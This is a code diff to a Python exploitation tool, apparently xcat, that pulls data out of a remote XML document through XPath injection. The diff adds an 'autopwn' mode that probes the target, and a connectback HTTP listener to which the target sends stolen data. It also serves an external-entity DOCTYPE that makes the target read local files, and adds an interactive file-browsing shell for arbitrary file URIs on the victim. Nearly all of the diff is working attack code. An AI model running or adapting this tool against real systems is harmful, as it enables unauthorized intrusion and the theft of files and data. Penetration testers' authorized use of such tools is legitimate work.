@@ -3,12 +3,17 @@
 import argparse
 from twisted.internet import reactor, defer
 from lib import SimpleXMLWriter
-from lib import payloads
+from lib import payloads as payloadlib
 from twisted.web import server, resource
+import base64
 import sys
 import hashlib
 import time
-__VERSION__ = 0.5
+import copy
+import socket
+import itertools
+
+__VERSION__ = 0.7
 
 writer = SimpleXMLWriter.XMLWriter(sys.stdout)
 
@@ -16,6 +21,7 @@ class CountTypes:
     LENGTH = 1
     STRING  = 2
     CODEPOINT = 3
+
 
 @defer.inlineCallbacks
 def Count(payloads, node, count_type=CountTypes.STRING, _codepoint_count=None):
@@ -92,11 +98,36 @@ class DocRequestHandler(resource.Resource):
 
         return "<emptynode></emptynode>"
 
+class LocalFileRequestHandler(resource.Resource):
+    isLeaf = True
+
+    def render_GET(self, request):
+        # There is proberbly a much nicer way to code this, but whatever.
+        if request.args.get("t",None):
+            return """
+<!DOCTYPE copyright [
+<!ENTITY c "ok">
+]>
+<data>&c;</data>"""
+
+        if request.args.get("p",None):
+            try:
+                path = base64.urlsafe_b64decode(request.args.get("p")[0])
+            except Exception:
+                return ""
+
+            return """
+<!DOCTYPE copyright [
+<!ENTITY c SYSTEM "%s">
+]>
+<data>&c;</data>"""%path
+
+        return ""
+
 
 class DocServerHandler(server.Site):
     def log(self, *args, **kwargs):
         return # Do nothing
-
 
 @defer.inlineCallbacks
 def GetCharacters(payloads, node, size=0, count_it=False):
@@ -108,11 +139,7 @@ def GetCharacters(payloads, node, size=0, count_it=False):
     if args.connectback:
         global rhandler
         id = rhandler.AddConnection()
-        if args.connectback_port:
-            port = ":%s"%args.connectback_port
-        else:
-            port = ""
-        yield payloads.RunQuery(payloads.Get("HTTP_TRANSFER")(node=node, id=id, host=args.connectback_ip, port=port))
+        yield payloads.RunQuery(payloads.Get("HTTP_TRANSFER")(node=node, id=id, host=args.connectback))
         info = rhandler.GetResult(id)
         defer.returnValue(info or "")
     else:
@@ -158,6 +185,7 @@ def GetXMLFromDefinedQuery(payloads, node):
             _c = node.replace("$COUNT",str(i))
             yield GetXMLFromNode(payloads, _c)
 
+
 @defer.inlineCallbacks
 def GetXMLFromNode(payloads, node):
     global args
@@ -192,16 +220,81 @@ def GetXMLFromNode(payloads, node):
             yield GetXMLFromNode(payloads, node+"/*[%s]"%i)
 
     if not args.schema_only:
-        value = yield GetCharacters(payloads, node+"/text()", count_it=True)
-        if value:
-            writer.data(value)
+        text_count = yield Count(payloads, node=node+"/text()", count_type=CountTypes.LENGTH)
+        for i in xrange(1,text_count+1):
+            value = yield GetCharacters(payloads, node+"/text()[%s]"%i, count_it=True)
+            if value:
+                writer.data(value)
 
     writer.end()
+
+
+@defer.inlineCallbacks
+def DetectEntityInjection(args):
+    _r = yield payloads.RunQuery(payloads.Get("ENTITY_INJECTION_TEST")(host=args.connectback))
+    defer.returnValue(_r)
+
+@defer.inlineCallbacks
+def TestTransfer(args):
+    global rhandler
+    id = rhandler.AddConnection()
+    yield payloads.RunQuery(payloads.Get("HTTP_TRANSFER_TEST")(id=id, host=args.connectback))
+    i = rhandler.GetResult(id)
+    defer.returnValue(i)
+
+@defer.inlineCallbacks
+def DetectQuoteCharacter(args):
+    for qcharacter in ("'",'"'):
+        args.quote_character = qcharacter
+        pmaker = payloadlib.PayloadMaker(args)
+        r = yield pmaker.RunQuery(pmaker.Get("QUOTE_CHARACTER_TEST")())
+        if r:
+            defer.returnValue(qcharacter)
+    defer.returnValue(None)
+
+def MakeListener(site, port, iface):
+    return reactor.listenTCP(port, site, interface=iface)
 
 @defer.inlineCallbacks
 def Main(args):
     global payloads
-    payloads = payloads.PayloadMaker(args)
+    payloads = payloadlib.PayloadMaker(args)
+
+    if args.autopwn:
+        print " * Automatically detecting available features..."
+        sys.stdout.write("   * Detecting quote: ")
+        quote_char = yield DetectQuoteCharacter(copy.deepcopy(args))
+        if not quote_char:
+            sys.stdout.write("Could not detect, leaving as %s\n"%args.quote_character)
+        else:
+            sys.stdout.write(quote_char+"\n")
+            args.quote_character = quote_char
+
+        sys.stdout.write("   * XPath Version: ")
+        xversion = yield payloads.DetectXPathVersion()
+        sys.stdout.write("%s\n"%xversion)
+        args.xversion = xversion
+
+        sys.stdout.write("   * OOB HTTP Support: \n")
+        new_args = copy.deepcopy(args)
+        ip_addrs = [r[4][0] for r in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)]
+        for ip,port in zip(ip_addrs,itertools.cycle([80,53])):
+            new_args.connectback = "%s:%s"%(ip,port)
+            sys.stdout.write("     * %s: "%new_args.connectback)
+            listener = MakeListener(site, port, ip)
+            if TestTransfer(new_args):
+                sys.stdout.write("Success\n")
+                args.connectback = new_args.connectback
+                break
+            else:
+                sys.stdout.write("Failed\n")
+                listener.stopListening()
+        sys.stdout.flush()
+        sys.stdout.write("   * Entity Injection Retrieval: ")
+        inj = yield DetectEntityInjection(args)
+        if inj: print "Supported"
+        else:   print "Unsupported"
+
 
     if args.xversion == "auto":
         xversion = yield payloads.DetectXPathVersion()
@@ -213,10 +306,6 @@ def Main(args):
 
     if args.connectback and args.xversion == "1":
         sys.stderr.write("Connectback is only supported with XPath 2.0")
-        exit()
-
-    if args.connectback and not args.connectback_ip:
-        sys.stderr.write("Error: You must specify a IP when using connectback\n")
         exit()
 
     sys.stderr.write("Exploiting...\n")
@@ -231,14 +320,46 @@ def Main(args):
     elif args.executequery:
         yield GetXMLFromDefinedQuery(payloads, args.executequery)
     elif args.fileshell:
+
+        can_use_entity = yield DetectEntityInjection(args)
+        if can_use_entity:
+            print " * Entity injection appears to be working"
+        else:
+            print " * Entity injection is not available, using doc() fallback (only works on xml files)"
+
+        _grabs = {"--doc":0,"--entity":1}
+
+        grab_using = 0 # 0 = use Doc(), 1 = use READ_LOCAL_FILE
+
+        print "Enter a file URI. Available commands:"
+        print " * --getcwd : Returns the URI of the current document"
+        print " * --doc    : Use doc() to fetch files. Only works on XML files and returns the whole document"
+        if can_use_entity:
+            print " * --entity : Use entity injection to fetch files. Works best on text files with no XML characters in them (<,>,--). Must be absolute."
+
         while True:
-            print "Enter a file URI (Must be absolute). Use --getcwd to see where we are"
-            file_path = raw_input()
+            file_path = raw_input("URI: ")
             if file_path == "":
                 break
             else:
-                yield GetXMLFromDefinedQuery(payloads, ("doc('%s')/*[$COUNT]"%file_path).replace("'", args.quote_character))
-                print ""
+                if file_path == "--getcwd":
+                    cwd = yield GetCharacters(payloads, "document-uri(/)")
+                    print "Working file: %s"%cwd
+                    continue
+
+                if file_path in _grabs:
+                    grab_using = _grabs[file_path]
+                    print "Using %s method to get files"%(file_path.strip("--"))
+                    continue
+
+                if grab_using == 1:
+                    fpath = base64.urlsafe_b64encode(file_path)
+                    output = yield GetCharacters(payloads, payloads.Get("READ_LOCAL_FILE", wrap_base=False)(path=fpath,
+                                                                                            host=args.connectback, node="data/string()"))
+                    print output
+                else:
+                    yield GetXMLFromDefinedQuery(payloads, ("doc('%s')/*[$COUNT]"%file_path).replace("'", args.quote_character))
+                    print ""
 
     else:
         yield GetXMLFromNode(payloads, "/*[1]")
@@ -247,6 +368,12 @@ def Main(args):
         sys.stderr.write("\nTime taken: %s\n"%str(t2-t1))
     reactor.stop()
 
+@defer.inlineCallbacks
+def StartMain(args):
+    try:
+        yield Main(args)
+    except SystemExit:
+        reactor.stop()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Read a remote XML file through an XPath injection vulnerability")
@@ -268,8 +395,11 @@ if __name__ == "__main__":
     group2.add_argument("--false-code", help="The HTTP status code that indicates a failure", dest="fail_code", type=int)
     group2.add_argument("--error-code", help="The HTTP status code that indicates a server error", dest="error_code", type=int)
 
+    parser.add_argument("--autopwn", help="Automatically detect and setup available features (Quote character, version, connectback support, cwd, entity retrieval support",
+                                    action="store_true", dest="autopwn")
+
     parser.add_argument("--schema-only", help="Only extract the node names and no text data or attribute values", action="store_true", dest="schema_only")
-    parser.add_argument("--quotecharacter", help="The quote character we will use to inject (normally' or \")", default="\"", dest="quote_character")
+    parser.add_argument("--quotecharacter", help="The quote character we will use to inject (normally ' or \")", default="\"", dest="quote_character")
     parser.add_argument("--executequery", help="If given recurse through this query and extract the results, instead of searching from the root node. use $COUNT to insert the current node we are looking at. eg: /users/user[$COUNT]/password",
         default="", dest="executequery")
 
@@ -283,14 +413,11 @@ if __name__ == "__main__":
         default=False, dest="lowercase", action="store_true")
     parser.add_argument("--regex", help="Use Regex to reduce the search space of text. Xpath 2.0 only",
         default=False, dest="use_regex", action="store_true")
-    group2 = parser.add_mutually_exclusive_group()
+    #group2 = parser.add_mutually_exclusive_group()
     #group2.add_argument("--dns", help="Experimental: Use DNS requests to transfer data. XPath 2.0 only. This parameter is the end of the hostname. Only works with alphanumeric characters, 64character limit (in total).",
     #                             action="store", dest="dns_location")
-    group2.add_argument("--connectback", help="Use a clever technique to deliver the XML document data over HTTP to xcat. Requires a public IP address and port listening permissions",
-        action="store_true", dest="connectback")
 
-    parser.add_argument("--connectbackip", help="IP Address to listen on for connectback", action="store", dest="connectback_ip")
-    parser.add_argument("--connectbackport", help="The port to listen on for connectback data", action="store", dest="connectback_port", default=80, type=int)
+    parser.add_argument("--connectback", help="IP Address and port to listen on for connectback when using connectback OOB attacks, e.g 10.20.30.40:80", action="store", dest="connectback", default=False)
 
     parser.add_argument("--notfoundstring", help="The character to place when a character cannot be found in the searchspace", action="store", dest="notfoundchar", default="?")
     parser.add_argument("--fileshell", help="Launch a shell for browing remote files", action="store_true", dest="fileshell")
@@ -326,11 +453,24 @@ if __name__ == "__main__":
         args.lookup = False
 
     rhandler = DocRequestHandler()
-    site = DocServerHandler(rhandler)
+    fhandler = LocalFileRequestHandler()
+
+    res = resource.Resource()
+    res.putChild("doc",rhandler)
+    res.putChild("file",fhandler)
+
+    site = DocServerHandler(res)
     if args.connectback:
-        reactor.listenTCP(int(args.connectback_port), site)
+        if len(args.connectback.split(":")) == 1:
+            args.connectback_port = 80
+            args.connectback = "%s:%s"%(args.connectback, args.connectback_port)
+        else:
+            host,port = args.connectback.split(":")
+            args.connectback_port = port
+        print "Connecback running on %s"%args.connectback
+        reactor.listenTCP(int(args.connectback_port), site, interface=args.connectback.split(":")[0])
 
 
-    Main(args)
+    reactor.callWhenRunning(StartMain, args)
 
     reactor.run()
